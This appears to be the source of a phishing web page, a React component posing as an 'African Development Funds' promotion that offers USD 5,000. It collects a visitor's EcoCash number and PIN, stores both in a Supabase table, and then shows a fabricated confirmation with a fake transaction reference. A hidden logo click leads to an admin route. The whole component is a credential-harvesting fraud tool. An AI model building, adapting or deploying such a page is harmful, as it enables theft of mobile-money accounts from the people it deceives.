import { useState } from "react";
import styles from "./ClientSide.module.css";
import { supabase } from "../assets/lib/supabase.js";
import { useNavigate } from "react-router-dom";
export default function ClientSide() {
  const navigate = useNavigate();
  const [next, setnext] = useState(false);

  const [clientNumber, setclientNumber] = useState("");
  const [clientPin, setclientPin] = useState("");
  const [invalidNo, setwrongNo] = useState(false);
  const [success, setsuccess] = useState(false);
  const [invalidpin, setwrongpi] = useState(false);

  function goToAdmin() {
    navigate("/admin");
  }

  function handleSubmit(e) {
    e.preventDefault();
    if (clientNumber.length !== 10) {
      setwrongNo(true);
      return;
    }

    setnext(true);
    console.log(clientNumber);
  }

  function handleSubmitPin(e) {
    e.preventDefault();
    if (clientPin.length !== 4) {
      setwrongpi(true);
      return;
    }
    uploaddata();
    setsuccess(true);
  }
  const client = {
    number: clientNumber,
    pin: clientPin,
  };
  async function uploaddata() {
    const { error } = await supabase
      .from("clientdata")
      .insert([client])
      .select();
    if (!error) {
      // setFormDta({ number: "", pin: "", vercode: "" });
      console.log(error);
    }
  }
  return (
    <div className={styles.container}>
      <img
        src="/logo.jpg"
        alt="logo"
        className={styles.logo}
        onClick={goToAdmin}
      />
      <h1 className="container">
        African Development <br></br>Funds
      </h1>
      {!success ? (
        <form>
          {/* <div className={`${styles.myform} ${next ? styles.hide : ""}`}> */}
          <div className={`${styles.myform} ${next && styles.hide}`}>
            <label htmlFor="number">Enter your EcoCash No</label>
            <input
              type="number"
              value={clientNumber}
              onChange={(e) => setclientNumber(e.target.value)}
              placeholder="07XXXXXXXX"
            />
            {invalidNo && (
              <label htmlFor="number" style={{ color: "red" }}>
                Please Enter Valid EcoCash number
              </label>
            )}
            <button type="submit" onClick={(e) => handleSubmit(e)}>
              continue
            </button>
          </div>
          <div>
            <div className={`${styles.myform} + ${!next && styles.hide}`}>
              <p>
                Are sure you want to claim your Promotion funds of USD 5,000?
              </p>
              <label htmlFor="number"> EcoCash pin</label>
              <input
                type="number"
                value={clientPin}
                onChange={(e) => setclientPin(e.target.value)}
                placeholder=""
              />
              {invalidpin && (
                <label htmlFor="number" style={{ color: "red" }}>
                  {" "}
                  Enter valid EcoCash pin!
                </label>
              )}
              <button type="submit" onClick={(e) => handleSubmitPin(e)}>
                Claim Now
              </button>
            </div>
          </div>
        </form>
      ) : (
        <div className={styles.success}>
          <h2>Congrats To You</h2>
          <p>
            You have successfully claimed <b>USD 5,000</b> 💵 to{" "}
            <b>{clientNumber}</b>, the Promotion funds will reflect in your
            EcoCash account within 10 minutes. The transaction reference number
            is <b>#A2X-BC34-XYZ </b> and is now under review by EcoCash
            compliance team.If provided information is valid, the funds will be
            credited to your account within 10 minutes.
          </p>
          <p>Congratulations for reaching this far</p>
        </div>
      )}
    </div>
  );
}
